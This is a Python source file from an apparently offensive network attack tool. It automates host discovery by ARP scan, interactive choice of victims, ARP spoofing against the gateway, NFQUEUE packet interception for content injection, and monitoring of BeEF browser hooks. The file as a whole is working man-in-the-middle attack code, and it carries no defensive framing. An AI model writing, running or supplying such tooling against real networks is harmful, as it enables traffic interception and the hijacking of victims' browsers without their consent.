"""
Auto-hook agent mode.

This module provides automated host discovery, target selection, ARP spoofing,
and BeEF hook monitoring in a single command.
"""

import ipaddress
from dataclasses import dataclass

from scapy.all import ARP, Ether, srp

from .interceptor import NFQueueLoop
from .mitm import ARPSpoofer


@dataclass
class DiscoveredHost:
    """Information about a discovered host."""

    ip: str
    mac: str
    hostname: str | None = None


class NetworkScanner:
    """
    Network scanner for discovering live hosts on the local subnet.
    """

    def __init__(self, interface: str = "eth0", verbose: bool = False):
        """
        Initialize the network scanner.

        Args:
            interface: Network interface to use
            verbose: Enable verbose logging
        """
        self.interface = interface
        self.verbose = verbose

    def scan_subnet(self, subnet: str) -> list[DiscoveredHost]:
        """
        Scan a subnet for live hosts using ARP.

        Args:
            subnet: Subnet to scan (e.g., "192.168.1.0/24")

        Returns:
            List of discovered hosts
        """
        try:
            network = ipaddress.ip_network(subnet)
        except ValueError as e:
            print(f"Invalid subnet: {e}")
            return []

        if self.verbose:
            print(f"Scanning subnet {subnet}...")

        # Create ARP request for all hosts in subnet
        arp_request = ARP(pdst=str(network))
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request

        # Send and receive ARP requests
        result = srp(packet, timeout=2, verbose=False)[0]

        hosts = []

        for _sent, received in result:
            host = DiscoveredHost(ip=received.psrc, mac=received.hwsrc)
            hosts.append(host)

            if self.verbose:
                print(f"Found host: {host.ip} ({host.mac})")

        if self.verbose:
            print(f"Discovered {len(hosts)} live hosts")

        return hosts

    def get_local_subnet(self) -> str | None:
        """
        Attempt to determine the local subnet.

        Returns:
            Subnet string or None if unable to determine
        """
        # This is a simplified implementation
        # In a real implementation, you'd parse interface configuration
        # For now, return a common default
        return "192.168.1.0/24"


class AutoHookAgent:
    """
    Automated hook agent that combines network scanning, target selection,
    ARP spoofing, and BeEF monitoring.
    """

    def __init__(
        self,
        interface: str = "eth0",
        gateway: str | None = None,
        subnet: str | None = None,
        verbose: bool = False,
    ):
        """
        Initialize the auto-hook agent.

        Args:
            interface: Network interface
            gateway: Gateway IP (auto-detect if None)
            subnet: Subnet to scan (auto-detect if None)
            verbose: Enable verbose logging
        """
        self.interface = interface
        self.gateway = gateway
        self.subnet = subnet
        self.verbose = verbose

        self.scanner = NetworkScanner(interface, verbose)
        self.discovered_hosts: list[DiscoveredHost] = []
        self.selected_targets: set[str] = set()

    def discover_hosts(self) -> list[DiscoveredHost]:
        """
        Discover live hosts on the network.

        Returns:
            List of discovered hosts
        """
        if not self.subnet:
            self.subnet = self.scanner.get_local_subnet()

        self.discovered_hosts = self.scanner.scan_subnet(self.subnet)
        return self.discovered_hosts

    def select_targets_interactive(self) -> set[str]:
        """
        Interactively select targets from discovered hosts.

        Returns:
            Set of selected target IP addresses
        """
        if not self.discovered_hosts:
            print("No hosts discovered. Run discover_hosts() first.")
            return set()

        print("\nDiscovered hosts:")
        for i, host in enumerate(self.discovered_hosts, 1):
            print(f"  {i}. {host.ip} ({host.mac})")

        print("\nSelect targets (comma-separated numbers, or 'all'):")
        selection = input("> ").strip()

        if selection.lower() == "all":
            self.selected_targets = {host.ip for host in self.discovered_hosts}
        else:
            try:
                indices = [int(x.strip()) for x in selection.split(",")]
                self.selected_targets = {
                    self.discovered_hosts[i - 1].ip
                    for i in indices
                    if 1 <= i <= len(self.discovered_hosts)
                }
            except ValueError:
                print("Invalid selection. No targets selected.")
                return set()

        if self.verbose:
            print(f"Selected targets: {', '.join(self.selected_targets)}")

        return self.selected_targets

    def run_auto_hook(self, injector, config, beef_integration=None) -> None:
        """
        Run the complete auto-hook workflow.

        Args:
            injector: Injection strategy to use
            config: Configuration object
            beef_integration: Optional BeEF integration instance
        """
        # Discover hosts
        print("=== Phase 1: Network Discovery ===")
        self.discover_hosts()

        if not self.discovered_hosts:
            print("No hosts discovered. Exiting.")
            return

        # Select targets
        print("\n=== Phase 2: Target Selection ===")
        self.select_targets_interactive()

        if not self.selected_targets:
            print("No targets selected. Exiting.")
            return

        # Start ARP spoofing
        print("\n=== Phase 3: ARP Spoofing ===")

        if not self.gateway:
            # Use first discovered host's gateway (simplified)
            self.gateway = input("Enter gateway IP: ").strip()

        arp_spoofer = ARPSpoofer(
            targets=self.selected_targets,
            gateway=self.gateway,
            interface=self.interface,
            verbose=self.verbose,
        )

        # Start packet interception
        print("\n=== Phase 4: Packet Interception ===")

        nfqueue_loop = NFQueueLoop(
            injector=injector,
            config=config.injection,
            targets=self.selected_targets,
            queue_num=config.network.queue_num,
            verbose=self.verbose,
        )

        # Start BeEF monitoring if enabled
        if beef_integration and config.beef.enabled:
            print("\n=== Phase 5: BeEF Monitoring ===")
            import threading

            beef_thread = threading.Thread(
                target=beef_integration.monitor_hooks,
                args=(config.beef.poll_interval,),
                daemon=True,
            )
            beef_thread.start()

        print("\n=== Auto-Hook Agent Running ===")
        print("Press Ctrl+C to stop and restore ARP tables\n")

        try:
            # Start ARP spoofing in background
            import threading

            arp_thread = threading.Thread(target=arp_spoofer.start, daemon=True)
            arp_thread.start()

            # Start NFQUEUE loop (blocks)
            nfqueue_loop.start()

        except KeyboardInterrupt:
            print("\n\n=== Cleanup ===")
            arp_spoofer.cleanup()
            if beef_integration:
                beef_integration.stop()
            print("ARP tables restored. Exiting.")
